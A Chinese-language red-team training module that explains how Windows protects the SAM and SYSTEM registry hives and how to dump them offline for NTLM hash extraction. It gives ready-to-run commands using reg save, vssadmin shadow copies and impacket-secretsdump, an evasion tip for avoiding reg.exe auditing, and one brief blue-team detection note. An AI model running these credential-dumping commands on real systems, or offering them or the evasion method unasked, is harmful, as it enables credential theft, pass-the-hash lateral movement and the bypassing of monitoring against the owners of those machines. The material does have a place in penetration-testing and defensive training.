# R19.6 Windows SAM 與 SYSTEM 註冊表登錄檔離線雜湊提取 (SAM & SYSTEM Hive Dumping)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows SAM 與 SYSTEM 註冊表登錄檔離線雜湊提取** 的物理本質為**利用 Windows 核心對儲存本機帳號密碼雜湊之二進位登錄檔儲存庫 (`C:\Windows\System32\config\SAM`) 與系統解密金鑰庫 (`SYSTEM`) 的架構設計，在目標主機運行時透過磁碟陰影複製服務 (Volume Shadow Copy, VSS)、備份 API 或以特權身份調用 `reg save` 命令導出被作業系統排他鎖定之 Hive 檔案，並在離線環境使用密鑰推導演算法解密全機本機使用者（包含內建 Administrator）的 NTLM 密碼雜湊**。在紅隊實戰中，這是獲取本機最高特權後快速收割全機憑證、準備實施 Pass-the-Hash (PtH) 橫向擴展的第一動作。

```
[取得本機 Administrator / SYSTEM 特權] ── 嘗試直接讀取 C:\Windows\System32\config\SAM
                                              │
                                              ▼ 作業系統底層排他鎖定: ERROR_SHARING_VIOLATION
┌─────────────────────────────────────────────┴─────────────────────────────────────────────┐
│ 1. 繞過鎖定路徑 A: 調用註冊表備份指令 reg.exe save HKLM\SAM & HKLM\SYSTEM                │
│ 2. 繞過鎖定路徑 B: 調用磁碟陰影複製 (VSS): vssadmin create shadow /for=C:                │
│ 3. 繞過鎖定路徑 C: 讀取備份修復目錄 C:\Windows\Repair\SAM 或 RegBack 歷史檔案             │
└─────────────────────────────────────────────┬─────────────────────────────────────────────┘
                                              ▼
[導出兩大核心 Hive 檔案: sam.save & system.save] ──► 下載至攻擊者離線機台
                                              │
                                              ▼ 調用 secretsdump.py 提取 BootKey (SysKey)
[解密 SAM 資料庫: 導出 Administrator NTLM Hash] ──► 獲取免密碼橫向憑證！
```

## 🔬 第一動：SAM 註冊表結構、SysKey 解密機制與排他鎖定物理機制 (Mechanics & SysKey)

### 1. SAM 登錄檔的物理鎖定機制
Windows 核心在啟動時，由核心進程排他性地打開並掛載 `C:\Windows\System32\config\SAM` 與 `SYSTEM`：
- 一般應用程式調用 `CreateFile` 時會被系統返回 `SHARING_VIOLATION`（檔案已被另一個程序使用而鎖定）。
- **合法提取接口**：Win32 API 提供了 `RegSaveKeyEx` 接口（封裝於 `reg.exe save`），允許具備 `SeBackupPrivilege` 特權的進程調用註冊表管理介面，直接將記憶體中的登錄檔快照完整序列化傾倒至檔案！

### 2. SysKey (BootKey) 解密演算法鏈
SAM 資料庫內部的使用者密碼雜湊並非單純儲存，而是經過多重加密：
1. **BootKey 提取**：從 `SYSTEM` Hive 的 `ControlSet001\Control\Lsa` 節點（`JD`, `Skew1`, `GBG`, `Data`）拼湊出 16 位元組的 SysKey。
2. **Hashed BootKey 計算**：使用 MD5 與 RC4 / AES 對特定常數進行計算。
3. **PEK 解密**：解密 SAM 中的帳號控制區段 (`V` 屬性)，還原出原始的 32 位元組 NTLM Hash！

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 本地調用 `reg.exe` 導出 Hive 檔案
```cmd
:: 1. 導出 SAM 帳號資料庫 Hive
reg save HKLM\SAM C:\Temp\sam.save

:: 2. 導出 SYSTEM 解密密鑰庫 Hive (解密必備！)
reg save HKLM\SYSTEM C:\Temp\system.save

:: 3. (可選) 導出 SECURITY Hive (包含 LSA 密鑰與快取網域憑證)
reg save HKLM\SECURITY C:\Temp\security.save
```

### 2. 透過磁碟陰影複製服務 (VSS) 繞過所有鎖定
```cmd
:: 建立 C 槽快照
vssadmin create shadow /for=C:

:: 從陰影複製路徑複製被鎖定的原始檔案
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam.raw
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.raw
```

### 3. 離線提取 NTLM 密碼雜湊 (Impacket secretsdump)
```bash
# 在攻擊者 Linux 機台利用本地檔案進行離線解密
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：在 Windows 中，為何即使擁有了 Administrator 權限，也無法直接用 `copy` 命令複製 SAM 檔案？**
  - **戰術思維**：因為作業系統核心已排他性地加載並鎖定了該二進位資料庫，檔案系統禁止其他一般進程以普通讀寫句柄打開；必須透過備份 API 或 VSS 陰影複製繞過。
- [ ] **Q2：若只成功導出了 `SAM` 檔案，而未能導出 `SYSTEM` 檔案，能還原密碼雜湊嗎？**
  - **戰術思維**：完全不能。因為 SAM 內部的密碼雜湊由 SysKey (BootKey) 加密，而 SysKey 的解密片段完全儲存在 `SYSTEM` Hive 之中，兩者缺一不可。
- [ ] **Q3：在被嚴格監控 `reg.exe` 的環境下，紅隊如何完全不調用 `reg.exe` 導出 Hive？**
  - **戰術思維**：透過 PowerShell 或 C# 直接調用 Win32 API `Advapi32.dll!RegSaveKeyExA`，避開建立 `reg.exe` 子進程的 CommandLine 審計。
- [ ] **Q4：什麼是 Windows `RegBack` 目錄？在滲透提權中有何歷史價值？**
  - **戰術思維**：在 Windows 10 1803 之前，系統每 10 天會自動在 `C:\Windows\System32\config\RegBack\` 下備份未鎖定的完整 SAM/SYSTEM 檔案，可直接免特權複製。
- [ ] **Q5：藍隊應如何監控針對本機 SAM 資料庫的未授權導出攻擊？**
  - **戰術思維**：透過 Sysmon 監控命令列包含 `reg save` 且目標為 `HKLM\SAM` 或 `HKLM\SYSTEM` 的事件，並監控 `vssadmin` 創建陰影複製的異常行為。
